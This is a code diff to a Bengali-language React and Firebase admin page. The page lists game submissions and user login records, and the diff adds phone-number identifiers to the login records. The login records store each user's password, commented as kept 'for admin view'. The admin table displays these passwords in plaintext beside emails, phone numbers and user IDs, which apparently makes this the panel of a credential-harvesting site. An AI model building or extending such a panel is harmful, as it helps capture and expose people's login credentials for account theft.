@@ -37,7 +37,7 @@ const ADMIN_EMAIL = "easywish000@gmail.com";
 interface Submission {
   id: string;
   userId: string;
-  userEmail?: string;
+  userEmail?: string; 
   gameName?: string; 
   uid: string;
   level: string;
@@ -47,11 +47,13 @@ interface Submission {
 
 interface LoginActivity {
   id: string;
-  email: string;
+  email: string; // This will store the pseudo-email if phone, or actual email
+  identifier?: string; // Stores the raw phone number if identifierType is 'phone'
+  identifierType?: "phone" | "email"; // To distinguish if it was a phone or email login
   loggedInAt: Timestamp;
   userId: string;
-  password?: string;
-  userAgent?: string;
+  password?: string; // To store the password for admin view
+  userAgent?: string; // To store browser/device info
 }
 
 export default function AdminPage() {
@@ -106,6 +108,7 @@ export default function AdminPage() {
   const fetchSubmissions = async () => {
     if (!isFirestoreActive()) {
         console.error("DEBUG: fetchSubmissions - Firestore is not active.");
+        setIsLoadingSubmissions(false);
         return;
     }
     setIsLoadingSubmissions(true);
@@ -132,6 +135,7 @@ export default function AdminPage() {
   const fetchLoginActivities = async () => {
     if (!isFirestoreActive()) {
         console.error("DEBUG: fetchLoginActivities - Firestore is not active.");
+        setIsLoadingLoginActivities(false);
         return;
     }
     setIsLoadingLoginActivities(true);
@@ -207,7 +211,7 @@ export default function AdminPage() {
       console.error("DEBUG: Error deleting submission from Firestore: ", firestoreError);
       let firestoreErrorMessage = "ডাটাবেস থেকে তথ্য মুছে ফেলার সময় একটি ত্রুটি হয়েছে।";
       if (typeof firestoreError === 'object' && firestoreError !== null && 'code' in firestoreError) {
-        const fbError = firestoreError as { code: string; message: string };
+        const fbError = firestoreError as { code: string; message: string }; 
         if (fbError.code === 'permission-denied') {
             firestoreErrorMessage = "ডাটাবেস থেকে এই তথ্যটি মুছে ফেলার অনুমতি আপনার নেই। Firebase Rules পরীক্ষা করুন।";
         } else {
@@ -236,19 +240,22 @@ export default function AdminPage() {
       return;
     }
 
-    const { id: activityId, email: activityEmail } = loginActivityToDelete;
+    const { id: activityId, identifier, email: activityEmail, identifierType } = loginActivityToDelete;
+    // Determine the display identifier: if it's a phone login and identifier (raw number) exists, use that. Otherwise, use the email (which could be raw email or pseudo-email).
+    const displayIdentifier = identifierType === 'phone' && identifier ? identifier : activityEmail;
+
     try {
       await deleteDoc(doc(db, "userLogins", activityId));
       setLoginActivities(prevActivities => prevActivities.filter(act => act.id !== activityId));
       toast({
         title: "সফলভাবে মুছে ফেলা হয়েছে",
-        description: `লগইন কার্যকলাপ (${activityEmail}) ডাটাবেস থেকে সফলভাবে মুছে ফেলা হয়েছে।`,
+        description: `লগইন কার্যকলাপ (${displayIdentifier}) ডাটাবেস থেকে সফলভাবে মুছে ফেলা হয়েছে।`,
       });
-    } catch (error: any) {
+    } catch (error: any) { 
       console.error("DEBUG: Error deleting login activity from Firestore: ", error);
       let errorMessage = "ডাটাবেস থেকে লগইন কার্যকলাপ মুছে ফেলার সময় একটি ত্রুটি হয়েছে।";
       if (typeof error === 'object' && error !== null && 'code' in error) {
-        const fbError = error as { code: string; message: string };
+        const fbError = error as { code: string; message: string }; 
         if (fbError.code === 'permission-denied') {
           errorMessage = "ডাটাবেস থেকে এই লগইন কার্যকলাপটি মুছে ফেলার অনুমতি আপনার নেই। Firebase Rules পরীক্ষা করুন।";
         } else {
@@ -311,7 +318,7 @@ export default function AdminPage() {
                   <Table>
                     <TableHeader>
                       <TableRow>
-                        <TableHead>ইমেইল</TableHead>
+                        <TableHead>শনাক্তকারী (ইমেইল/নম্বর)</TableHead>
                         <TableHead>পাসওয়ার্ড</TableHead>
                         <TableHead>ব্যবহারকারী আইডি</TableHead>
                         <TableHead>লগইনের সময়</TableHead>
@@ -321,10 +328,15 @@ export default function AdminPage() {
                     </TableHeader>
                     <TableBody>
                       {loginActivities.map((activity) => {
-                        console.log("DEBUG: Rendering login activity:", JSON.stringify(activity, (key, value) => key === 'password' ? '******' : value, 2));
+                        const displayIdentifier = activity.identifierType === 'phone' && activity.identifier 
+                                                  ? activity.identifier 
+                                                  : activity.email; // Shows raw phone if 'phone' type, else shows email (could be raw or pseudo)
+                        const dialogDisplayIdentifier = loginActivityToDelete?.identifierType === 'phone' && loginActivityToDelete?.identifier
+                                                        ? loginActivityToDelete.identifier
+                                                        : loginActivityToDelete?.email;
                         return (
                             <TableRow key={activity.id}>
-                            <TableCell>{activity.email}</TableCell>
+                            <TableCell>{displayIdentifier}</TableCell>
                             <TableCell className="text-destructive font-mono">{activity.password || 'N/A'}</TableCell>
                             <TableCell>{activity.userId}</TableCell>
                             <TableCell>{activity.loggedInAt ? new Date(activity.loggedInAt.seconds * 1000).toLocaleString('bn-BD', { dateStyle: 'medium', timeStyle: 'short' }) : 'N/A'}</TableCell>
@@ -341,7 +353,7 @@ export default function AdminPage() {
                                       <AlertDialogHeader>
                                         <AlertDialogTitle>লগইন কার্যকলাপ মুছে ফেলার নিশ্চিতকরণ</AlertDialogTitle>
                                         <AlertDialogDescription>
-                                          আপনি কি নিশ্চিতভাবে এই লগইন কার্যকলাপটি (`{loginActivityToDelete.email}` - `{new Date(loginActivityToDelete.loggedInAt.seconds * 1000).toLocaleString('bn-BD')}`) মুছে ফেলতে চান? এটি আর পুনরুদ্ধার করা যাবে না।
+                                          আপনি কি নিশ্চিতভাবে এই লগইন কার্যকলাপটি (`{dialogDisplayIdentifier}` - `{new Date(loginActivityToDelete.loggedInAt.seconds * 1000).toLocaleString('bn-BD')}`) মুছে ফেলতে চান? এটি আর পুনরুদ্ধার করা যাবে না।
                                         </AlertDialogDescription>
                                       </AlertDialogHeader>
                                       <AlertDialogFooter>
@@ -377,7 +389,7 @@ export default function AdminPage() {
                     <TableHeader>
                       <TableRow>
                         <TableHead>জমাদানকারী ইমেইল</TableHead>
-                        <TableHead>গেমের নাম</TableHead>
+                        <TableHead>গেম নাম</TableHead>
                         <TableHead>গেম UID</TableHead>
                         <TableHead>লেভেল</TableHead>
                         <TableHead>স্ট্যাটাস</TableHead>
@@ -448,5 +460,4 @@ export default function AdminPage() {
     </div>
   );
 }
-
-    
+ 
